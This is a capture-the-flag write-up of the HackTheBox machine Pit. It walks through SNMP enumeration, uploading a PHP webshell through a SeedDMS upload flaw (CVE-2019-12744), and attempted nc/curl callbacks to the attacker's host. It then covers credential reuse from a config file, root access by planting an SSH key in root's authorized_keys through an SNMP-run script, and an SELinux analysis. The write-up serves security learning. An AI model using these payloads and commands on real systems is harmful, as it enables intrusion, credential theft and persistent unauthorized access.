---
title: HTB: Pit
url: https://0xdf.gitlab.io/2021/09/25/htb-pit.html
date: 2021-09-25T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-pit, hackthebox, centos, nmap, udp, snmp, feroxbuster, snmpwalk, seeddms, cve-2019-12744, exploitdb, webshell, upload, selinux, cockpit, htb-sneaky, getfacl, facl, oscp-like-v2
---

![Pit](https://0xdfimages.gitlab.io/img/pit-cover.png)

Pit used SNMP in two different ways. First, I’ll enumerate it to leak the location of a webserver running SeedDMS, where I’ll abuse a webshell upload vulnerability to get RCE on the host. I’m not able to get a reverse shell because of SeLinux, but I can enumerate enough to find a password for michelle, and use that to get access to a Cockpit instance which offers a terminal. From there, I’ll find that I can write scripts that will be run by SNMP, and I’ll use that to get execution and a shell as root. In Beyond Root, a look at SeLinux and how it blocked things I tried to do on Pit.

## Box Info

| Name | [Pit](https://hackthebox.com/machines/pit)  [Pit](https://hackthebox.com/machines/pit) [Play on HackTheBox](https://hackthebox.com/machines/pit) |
| --- | --- |
| Release Date | [15 May 2021](https://twitter.com/hackthebox_eu/status/1392494135421120516) |
| Retire Date | 25 Sep 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Pit |
| Radar Graph | Radar chart for Pit |
| First Blood User | 01:35:19[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 02:00:33[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [GibParadox GibParadox](https://app.hackthebox.com/users/125033) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22), HTTP (80), and HTTPS (9090):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.241
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 09:35 EDT
Nmap scan report for 10.10.10.241
Host is up (0.10s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 25.01 seconds
oxdf@parrot$ nmap -p 22,80,9090 -sCV -oA scans/nmap-tcpscripts 10.10.10.241
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 09:41 EDT
Nmap scan report for 10.10.10.241
Host is up (0.089s latency).
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)                  
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin                           
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time                          
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=5/14%Time=609E7E56%P=x86_64-pc-linux-gn
...[SNIP]...

```

The service on 9090 has a certificate with the name dms-pit.htb, so I’ll add that to `/etc/hosts`.

I typically run a UDP scan in the background once I finish the TCP scans, but rarely show it because it doesn’t typically show anything interesting (or anything at all). UDP `nmap` is super finicky. One trick I like is to run scripts and/or check versions as I scan because if there are results that’s a much better indicator than if the port is just `open|filtered`. Here it does find SNMP on UDP 161:

```

oxdf@parrot$ sudo nmap -sU --top-ports 10 -sV 10.10.10.241
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 11:01 EDT
Nmap scan report for 10.10.10.241
Host is up (0.090s latency).

PORT     STATE    SERVICE      VERSION
53/udp   filtered domain
67/udp   filtered dhcps
123/udp  filtered ntp
135/udp  filtered msrpc
137/udp  filtered netbios-ns
138/udp  filtered netbios-dgm
161/udp  open     snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
445/udp  filtered microsoft-ds
631/udp  filtered ipp
1434/udp filtered ms-sql-m
Service Info: Host: pit.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.11 seconds

```

### Website - TCP 80

Visiting the site by IP address returns the default Red Hat NGINX page:

![image-20210514111324095](https://0xdfimages.gitlab.io/img/image-20210514111324095.png)

`feroxbuster` on this IP finds nothing.

Visiting `http://dms-pit.htb` returns 403:

![image-20210514111425727](https://0xdfimages.gitlab.io/img/image-20210514111425727.png)

`feroxbuster` finds a good deal of stuff on this url, but it’s all 403:

```

oxdf@parrot$ feroxbuster -u http://dms-pit.htb

 ___  ___  __   __     __      __         __   ___                  
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                 
by Ben "epi" Risher 🤓                 ver: 2.2.1              
───────────────────────────┬──────────────────────                
 🎯  Target Url            │ http://dms-pit.htb                  
 🚀  Threads               │ 50                                                            
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7                                                             
 🦡  User-Agent            │ feroxbuster/2.2.1                 
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────           
 🏁  Press [ENTER] to use the Scan Cancel Menu™                
──────────────────────────────────────────────────                  
403        7l       10w      169c http://dms-pit.htb/Conferences
403        7l       10w      169c http://dms-pit.htb/configurator
403        7l       10w      169c http://dms-pit.htb/autoconfig  
403        7l       10w      169c http://dms-pit.htb/disappearing
...[snip]...
403        7l       10w      169c http://dms-pit.htb/confridin
403        7l       10w      169c http://dms-pit.htb/webconfig
[####################] - 59s    29999/29999   0s      found:74      errors:0      
[####################] - 59s    29999/29999   506/s   http://dms-pit.htb

```

### HTTPS - TCP 9090

Visiting this by IP or dms-pit.htb gives the same page, a CentOS Linux remote access page:

![image-20210514112303071](https://0xdfimages.gitlab.io/img/image-20210514112303071.png)

Interestingly there’s another domain, `pit.htb`. After adding it to `/etc/hosts`, I checked this and the port 80, but nothing new.

### SNMP - UDP 161

To enumerate SNMP, you need a community string. By default, it’s always worth trying “public”. I’ll dump the entire SNMP into a file to look through with `snmp-walk` (I’ve also already got the mibs installed - see [Sneaky](/2021/03/02/htb-sneaky.html#snmp---udp-161) for details):

```

oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 . > scans/snmpwalk-full
oxdf@parrot$ wc -l scans/snmpwalk-full
1639 scans/snmpwalk-full

```

Looking at the data, a few things jump out.

The hostname is `pit.htb`:

```

SNMPv2-MIB::sysName.0 = STRING: pit.htb

```

I get a full process list, and while there are a few unfamiliar applications, nothing jumps out as interesting at this point. When I get to the section with the output line for the `monitoring` process, there’s some good information in the `NET-SNMP-EXTEND-MIB`:

```

NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       343Mi       3.2Gi       8.0Mi       295Mi       3.3Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 11:42:32 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00

```

The OS version is CentOS Linux 8.3.2011. It’s running SELinux, and there’s a user named michelle.

There’s another line that jumped out:

```

UCD-SNMP-MIB::dskPath.1 = STRING: /
UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms
UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root
UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms  

```

It’s not immediately clear to me what this is. But it’s a path that’s in the `/var/www/html` directory, which suggests that might be a path on the webserver.

### SeedDMS

#### Site

Visiting `http://dms-pit.htb/seeddms51x/seeddms/` redirects to a login page:

![image-20210514122210250](https://0xdfimages.gitlab.io/img/image-20210514122210250.png)

It claims to be a classified area. SeedDMS is a free document management system.

#### Login

At this point I do have a username, michelle. After a couple guesses, the password michelle provides access:

![image-20210514122627690](https://0xdfimages.gitlab.io/img/image-20210514122627690.png)

The “Upgrade Note” is interesting:

![image-20210514122741537](https://0xdfimages.gitlab.io/img/image-20210514122741537.png)

Because of the security issues in 5.1.10, they upgraded to 5.1.15.

I’ll also note that the urls within this application end in `.php`.

## Shell as michelle

### Identify Exploit

Looking at the changelog for version 5.1.11, the top issue is this one:

> - fix for CVE-2019-12744 (Remote Command Execution through unvalidated
>   file upload), add .htaccess file to data directory, better documentation
>   for installing seeddms

It sounds like the old version allowed for upload of PHP webshells. What’s surprising is the fix - “add `.htaccess` file”. That would probably work on Apache, but [not NGINX](https://stackoverflow.com/questions/35766676/how-can-i-use-an-htaccess-file-in-nginx), which this server is running.

There’s a public POC for this exploit on [ExploitDB](https://www.exploit-db.com/exploits/47022). Basically it says to upload a webshell and then find it at `/data/1048576/"document_id"/1.php`, where the document id is available in the file’s page once uploaded.

By hovering over the link to the `CHANGELOG` file, I can see it’s document\_id is 21:

![image-20210514125346587](https://0xdfimages.gitlab.io/img/image-20210514125346587.png)

I took a few guesses at the file structure to see if I could find the new `.htaccess` file, and eventually found it in `/data` at `http://dms-pit.htb/seeddms51x/data/.htaccess`:

```

# line below if for Apache 2.4
<ifModule mod_authz_core.c>
Require all denied
</ifModule>

# line below if for Apache 2.2
<ifModule !mod_authz_core.c>
deny from all
Satisfy All
</ifModule>

# section for Apache 2.2 and 2.4
<ifModule mod_autoindex.c>
IndexIgnore *
</ifModule>

```

On Apache, this would prevent access to any file inside `/data`. But again, this is NGINX.

### Webshell

It doesn’t look like I have access to upload to the root, but I’ll start digging in folders. Once I get to `/Docs/Users/`, there’s two directories, Michelle and Jack:

![image-20210514125936310](https://0xdfimages.gitlab.io/img/image-20210514125936310.png)

Based on the icon’s not being grayed out, I might have some permissions on Michelle.

Clicking on that, there’s not a bunch of options at the top, including to Add document:

![image-20210514130024685](https://0xdfimages.gitlab.io/img/image-20210514130024685.png)

I’ll upload my favorite simple PHP webshell:

```

<?php system($_REQUEST["cmd"]); ?>

```

![image-20210514130144165](https://0xdfimages.gitlab.io/img/image-20210514130144165.png)

The document ID is 31.

```

oxdf@parrot$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=id
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0

```

That’s code execution! This file is deleted every 5-10 minutes, so I may have to upload again, and the document id will increment as well.

### Reverse Shell Fail

I tried a bunch of things to get a reverse shell, but they all failed. When I couldn’t even get `curl` to connect to my host, I guessed maybe a firewall, but it was still acting weird.

```

oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=curl http://10.10.14.7 2>&1'

```

Looking at a `nc` connection back to me, it also failed:

```

oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=nc 10.10.14.7 443 2>&1'
Ncat: Permission denied.

```

Permission denied is interesting. I’ll look at the file:

```

oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /bin/nc'
lrwxrwxrwx. 1 root root 22 May 10 10:56 /bin/nc -> /etc/alternatives/nmap
oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /etc/alternatives/nmap'
lrwxrwxrwx. 1 root root 13 May 10 10:56 /etc/alternatives/nmap -> /usr/bin/ncat
oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /usr/bin/ncat'
-rwxr-xr-x. 1 root root 644376 Nov  8  2019 /usr/bin/ncat

```

Ignoring the fact that somehow the `nc` link is configured through the [alternatives](/2020/03/24/update-alternatives.html), the actual `ncat` binary has an extra `.` on the end of the permissions. That’s an indication the [SELinux is impacting the file](https://serverfault.com/questions/778407/linux-file-permission-got-a-ending-dot-and-webserver-denied-access).

`curl` has it too:

```

oxdf@parrot$ curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode 'cmd=ls -l /usr/bin/curl'
-rwxr-xr-x. 1 root root 244104 Dec 17 17:46 /usr/bin/curl

```

### Webshell Enum

I’ll use a simple Bash loop to enumerate the box through the webshell:

```

oxdf@parrot$ while :; do read -p "> " cmd; curl -G http://dms-pit.htb/seeddms51x/data/1048576/33/1.php --data-urlencode "cmd=$cmd 2>&1"; done
> id
uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
> ls
1.php
> nc 10.10.14.7 443
Ncat: Permission denied.

```

I’m not able to access `/home`:

```

> ls /home
ls: cannot open directory '/home': Permission denied

```

Looking at the web directories, there’s a `settings.xml` for the DMS:

```

> ls ../..
1048576
backup
cache
conf
log
lucene
staging
> ls ../../conf
settings.xml
settings.xml.template
stopwords.txt

```

Inside, this line has creds:

```

<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">

```

### Remote Shell

That password doesn’t work for SSH as michelle:

```

oxdf@parrot$ sshpass -p "ied^ieY6xoquu" ssh michelle@10.10.10.241
Warning: Permanently added '10.10.10.241' (ECDSA) to the list of known hosts.
michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).

```

It looks like key-based auth is required. But it will login as michelle via the service on TCP 9090:

![image-20210514140829578](https://0xdfimages.gitlab.io/img/image-20210514140829578.png)

The bottom option on the left side is Terminal:

![image-20210514141634210](https://0xdfimages.gitlab.io/img/image-20210514141634210.png)

Sometimes the text in the shell is all garbled:

![image-20210923143425844](https://0xdfimages.gitlab.io/img/image-20210923143425844.png)

Changing the appearance one or two times will fix that. I can copy out of the shell as well with `Ctrl-Insert`.

I can grab `user.txt`:

```

[michelle@pit ~]$ cat user.txt
78455c9b************************

```

## Shell as root

### Enumeration

As michelle, I can only see processes owned by michelle:

```

[michelle@pit .ssh]$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 245460 14256 ?        Ss   09:32   0:06 /usr/lib/systemd/systemd --switched-root --system --deserialize 17
michelle    4334  0.0  0.0  27400   516 ?        Ss   13:44   0:00 /usr/bin/ssh-agent
michelle    4337  0.0  0.2  94016  9996 ?        Ss   13:44   0:00 /usr/lib/systemd/systemd --user
michelle    4341  0.0  0.1 314728  5124 ?        S    13:44   0:00 (sd-pam)
michelle    4347  0.1  0.8 425048 32716 ?        Rl   13:44   0:05 cockpit-bridge
michelle    5939  0.0  0.0  24096  3932 pts/0    Ss   14:10   0:00 /bin/bash
michelle    7105  0.0  0.0  58692  4024 pts/0    R+   14:32   0:00 ps auxww

```

But I had SNMP access that gave the full process list. One of the things that was interesting was the output of the `NET-SNMP-EXTEND-MIB`. Some digging on that shows that it’s an extension that [allows for running of specific scripts](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/) triggered by SNMP. The command for that was also given:

```

NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor

```

`monitor` doesn’t show up with `which`, but it is in `/usr/bin`:

```

[michelle@pit /]$ which monitor
/usr/bin/which: no monitor in (/home/michelle/.local/bin:/home/michelle/bin:/home/michelle/.local/bin:/home/michelle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)
[michelle@pit /]$ find . -name monitor -ls 2>/dev/null
   517764      4 -rw-r--r--   1  root     root         3252 Jan  4 11:28 ./usr/share/snmp/snmpconf-data/snmpd-data/monitor
   797223      4 -rwxr--r--   1  root     root           88 Apr 18  2020 ./usr/bin/monitor

```

Only root can run it, which is why `which` doesn’t identify it.

The script itself is just a Bash script that finds scripts in `/usr/local/monitoring` and runs them:

```

[michelle@pit /]$ file /usr/bin/monitor 
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
[michelle@pit /]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done

```

I can’t read in that directory, and the directory itself is only writable by root:

```

[michelle@pit /]$ ls -l /usr/local/monitoring
ls: cannot open directory '/usr/local/monitoring': Permission denied
[michelle@pit /]$ ls -ld /usr/local/monitoring
drwxrwx---+ 2 root root 122 May 14 14:40 /usr/local/monitoring

```

However, there is a `+` at the end of the permissions, which means there’s additional ACLs set on the directory. michelle actually can write and execute from the directory:

```

[michelle@pit /]$ getfacl /usr/local/monitoring
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

```

### Execution as Root

I’ll write a simple script to `ping` my VM:

```

[michelle@pit monitoring]$ echo 'ping -c 1 10.10.14.7' > check_0xdf.sh
[michelle@pit monitoring]$ cat check_0xdf.sh
ping -c 1 10.10.14.7

```

The script works fine as michelle:

```

[michelle@pit monitoring]$ bash check_0xdf.sh
PING 10.10.14.7 (10.10.14.7) 56(84) bytes of data.
64 bytes from 10.10.14.7: icmp_seq=1 ttl=63 time=92.3 ms
--- 10.10.14.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 92.259/92.259/92.259/0.000 ms

```

Now I’ll trigger it via SNMP (I can trigger just the MIB for the monitoring script so that it doesn’t take minutes to run):

```

oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1             
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: ping: cap_set_proc: Permission denied                                                    
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: ping: cap_set_proc: Permission denied                                                     
Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       439Mi       3.0Gi       8.0Mi       393Mi       3.2Gi
Swap:         1.9Gi          0B       1.9Gi
...[snip]...

```

There’s some kind of permission denied on `ping` (last two lines starting with `NET-SNMP`), which is weird, but feels like SELinux. It does show it tried to run the script.

### Shell

I’ll try a script that will write an SSH key into root’s `authorized_keys` file:

```

[michelle@pit monitoring]$ echo 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" | tee /root/.ssh/authorized_keys && echo "it worked!"' > check_0xdf.sh

```

I use `tee` and the additional `echo` so that the output will be visible in the SNMP output to see if it worked.

On triggering that, the output looks good:

```

oxdf@parrot$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor   
NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING:           
NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING:      
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
it worked!
Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       449Mi       3.0Gi       8.0Mi       394Mi       3.2Gi 
...[snip]...

```

SSH will work to connect with the matching private key as root:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.241
Web console: https://pit.htb:9090/ or https://10.10.10.241:9090/

Last login: Mon May 10 11:42:46 2021
[root@pit ~]# 

```

And grab that flag:

```

[root@pit ~]# cat root.txt
a96b3445************************

```

## Beyond Root - SeLinux

### Background

I noted during solving that SeLinux was on the box, and blocking things I was trying to do. SeLinux puts a ton more granular permissions around not just file access but other kinds of access like sockets. It blocked reverse shells from the webshell. It also prevented me from using the SNMP scripts to access `root.txt`. For example, creating this script:

```

[michelle@pit monitoring]$ echo "echo "root flag:"; cat /root/root.txt" > check_root.sh

```

Running it results in these two lines:

```

NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: root flag:
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: cat: /root/root.txt: Permission denied 

```

And looking at the file, it’s got the `.` at the end of the permissions to indicate SeLinux:

```

[root@pit monitoring]# ls -l /root/root.txt 
-r--------. 1 root root 33 Sep 23 14:07 /root/root.txt

```

Using `-Z` with `ls` will show the SeLinux context:

```

[root@pit ~]# ls -Z root.txt 
unconfined_u:object_r:admin_home_t:s0 root.txt

```

So `root.txt` falls under the `admin_home_t` role.

### root.txt

SeLinux can run in two modes - Enforce (1) and Permissive (0). `getenforce` will return which mode is running:

```

[root@pit monitoring]# getenforce 
Enforcing

```

Enforcing will block specific activities, where as Permissive will just log them but let them happen.

For example, if I change the mode:

```

[root@pit monitoring]# setenforce permissive

```

And retrigger the SNMP script to get the root flag:

```

NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: root flag:
NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: 452a9b73************************ 

```

Logs are created at `/var/log/audit/audit.log`. When I tried to read `root.txt` with SNMP and it was blocked, this log was created:

```

type=AVC msg=audit(1632502921.588:5222): avc:  denied  { read } for  pid=14471 comm="cat" name="root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=0

```

In permissive mode, three logs were created:

```

type=AVC msg=audit(1632502973.982:5226): avc:  denied  { read } for  pid=14524 comm="cat" name="root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=AVC msg=audit(1632502973.982:5226): avc:  denied  { open } for  pid=14524 comm="cat" path="/root/root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=AVC msg=audit(1632502973.982:5227): avc:  denied  { getattr } for  pid=14524 comm="cat" path="/root/root.txt" dev="dm-0" ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1

```

The first was exactly the same as the previous log, except `permissive=1` instead of 0. Both of those were for the `read` syscall. The next two log in permissive mode were for the `open` and `getattr` on `root.txt`.

In all the logs, I can see the issue is with the `snmpd_t` role trying to access `admin_home_t`. If I pipe that log into `audit2allow`, it shows how to configure the system to not block this:

```

[root@pit audit]# cat audit.log | grep read | grep root.txt | tail -1 | audit2allow 

#============= snmpd_t ==============
allow snmpd_t admin_home_t:file read;

```

In this case, `snmpd_t` would need `file read` access to `admin_home_t`.

### Webshell

The reverse shell from the webshell was another thing that was blocked. In fact, any connection out to me was blocked. To demonstrate, I’l run `nc` over the webshell to just connect to my host:

```

oxdf@parrot$ curl -G --data-urlencode 'cmd=nc 10.10.14.7 443' http://dms-pit.htb/seeddms51x/data/1048576/29/1.php

```

It generates these logs:

```

type=AVC msg=audit(1632504453.554:5282): avc:  denied  { name_connect } for  pid=15554 comm="nc" dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
type=SYSCALL msg=audit(1632504453.554:5282): arch=c000003e syscall=42 success=no exit=-13 a0=3 a1=5635357392c0 a2=10 a3=3 items=0 ppid=15428 pid=15554 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm="nc" exe="/usr/bin/ncat" subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AUID="unset" UID="nginx" GID="nginx" EUID="nginx" SUID="nginx" FSUID="nginx" EGID="nginx" SGID="nginx" FSGID="nginx"
type=PROCTITLE msg=audit(1632504453.554:5282): proctitle=6E630031302E31302E31342E3700343433

```

I can feed that into `audit2why` to get more details about what’s going on:

```

[root@pit audit]# cat audit.log | grep 'comm="nc"' | tail -2 | audit2why
type=AVC msg=audit(1632504453.554:5282): avc:  denied  { name_connect } for  pid=15554 comm="nc" dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0

        Was caused by:
        One of the following booleans was set incorrectly.
        Description:
        Allow httpd to can network connect

        Allow access by executing:
        # setsebool -P httpd_can_network_connect 1
        Description:
        Allow httpd to graceful shutdown

        Allow access by executing:
        # setsebool -P httpd_graceful_shutdown 1
        Description:
        Allow httpd to can network relay

        Allow access by executing:
        # setsebool -P httpd_can_network_relay 1
        Description:
        Allow nis to enabled

        Allow access by executing:
        # setsebool -P nis_enabled 1

```

The messages assume that if you are looking, it’s supposed to be working (as opposed to detecting malicious activity). Still, the details are useful. There’s a rule preventing the `httpd` process from making outbound connections.

`Z` in `ps` will show the same thing for processes:

```

[root@pit audit]# ps auxwwZ | grep nginx
system_u:system_r:httpd_t:s0    root        1139  0.0  0.0 119280  2284 ?        Ss   Sep23   0:00 nginx: master process /usr/sbin/nginx
system_u:system_r:httpd_t:s0    nginx       1145  0.0  0.2 151984  8180 ?        S    Sep23   0:00 nginx: worker process
system_u:system_r:httpd_t:s0    nginx       1146  0.0  0.2 151984  8180 ?        S    Sep23   0:00 nginx: worker process
system_u:system_r:httpd_t:s0    nginx      15837  0.0  0.3 266780 12972 ?        S    13:35   0:00 php-fpm: pool www
system_u:system_r:httpd_t:s0    nginx      15838  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
system_u:system_r:httpd_t:s0    nginx      15839  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
system_u:system_r:httpd_t:s0    nginx      15840  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www
